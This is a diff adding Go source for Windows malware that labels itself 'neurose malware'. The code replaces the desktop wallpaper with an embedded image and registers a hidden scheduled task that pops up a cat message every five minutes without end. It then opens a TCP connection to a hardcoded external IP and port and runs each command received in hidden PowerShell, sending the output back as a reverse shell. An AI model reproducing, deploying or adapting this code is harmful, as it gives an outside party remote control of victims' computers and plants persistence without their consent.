@@ -1,0 +1,141 @@
+package main
+
+import (
+    "encoding/base64"
+    "net"
+    "os"
+    "os/exec"
+    "path/filepath"
+    "syscall"
+	"strings"
+	"unsafe"
+)
+
+var (
+    user32                   = syscall.NewLazyDLL("user32.dll")
+    procSystemParametersInfo = user32.NewProc("SystemParametersInfoW")
+)
+
+const (
+    SPI_SETDESKWALLPAPER  = 0x0014
+    SPIF_UPDATEINIFILE    = 0x0001
+    SPIF_SENDWININICHANGE = 0x0002
+)
+
+
+func setWallpaperFromBase64() error {
+    b64 := `
+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
+`
+
+    // strip whitespace/newlines
+    b64 = strings.ReplaceAll(b64, "\n", "")
+    b64 = strings.ReplaceAll(b64, "\r", "")
+    b64 = strings.TrimSpace(b64)
+
+    data, err := base64.StdEncoding.DecodeString(b64)
+    if err != nil {
+        return err
+    }
+
+    path := filepath.Join(os.TempDir(), "wall.jpg")
+    if err := os.WriteFile(path, data, 0644); err != nil {
+        return err
+    }
+
+    ptr, err := syscall.UTF16PtrFromString(path)
+    if err != nil {
+        return err
+    }
+
+    r, _, callErr := procSystemParametersInfo.Call(
+        uintptr(SPI_SETDESKWALLPAPER),
+        0,
+        uintptr(unsafe.Pointer(ptr)),
+        uintptr(SPIF_UPDATEINIFILE|SPIF_SENDWININICHANGE),
+    )
+    if r == 0 {
+        return callErr
+    }
+    return nil
+}
+
+func setupYapapa() {
+	ps := `
+# 1) Run popup once
+Add-Type -AssemblyName PresentationFramework
+[System.Windows.MessageBox]::Show("YAPAPA HAMEEEE 😺✨
+
+(=①ω①=) nyaaaaa~
+
+🐾 Blessed by the Yapapa Cat 🐾","🐱 Yapapa Time 🐱")
+
+# 2) Inner PS encoded
+$inner = @"
+Add-Type -AssemblyName PresentationFramework
+[System.Windows.MessageBox]::Show('YAPAPA HAMEEEE 😺✨
+
+(=①ω①=) nyaaaaa~
+
+🐾 Blessed by the Yapapa Cat 🐾','🐱 Yapapa Time 🐱')
+"@
+
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($inner)
+$enc = [Convert]::ToBase64String($bytes)
+
+# 3) Action
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument ("-NoProfile -WindowStyle Hidden -EncodedCommand $enc")
+
+# 4) Trigger (NO backticks!)
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)
+
+# 5) Register under current user
+Register-ScheduledTask -TaskName "YapapaCat" -User $env:USERNAME -Action $action -Trigger $trigger -Force
+`
+	exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps).Run()
+}
+
+
+func main() {
+    _ = setWallpaperFromBase64()
+	setupYapapa()
+
+    tmpPath := filepath.Join(os.TempDir(), "neurose.txt")
+    os.WriteFile(tmpPath, []byte("neurose malware"), 0644)
+
+    conn, err := net.Dial("tcp", "37.27.252.113:4443")
+    if err != nil {
+        return
+    }
+    defer conn.Close()
+
+    buf := make([]byte, 65535)
+
+    for {
+        n, err := conn.Read(buf)
+        if err != nil || n <= 0 {
+            return
+        }
+
+        cmdStr := string(buf[:n])
+
+        cmd := exec.Command("powershell.exe",
+            "-NoLogo",
+            "-NoProfile",
+            "-WindowStyle", "Hidden",
+            "-Command", cmdStr,
+        )
+
+        cmd.SysProcAttr = &syscall.SysProcAttr{
+            HideWindow: true,
+        }
+
+        out, err := cmd.CombinedOutput()
+        if err != nil {
+            out = append([]byte(err.Error()+"\n"), out...)
+        }
+
+        conn.Write(out)
+    }
+
+}
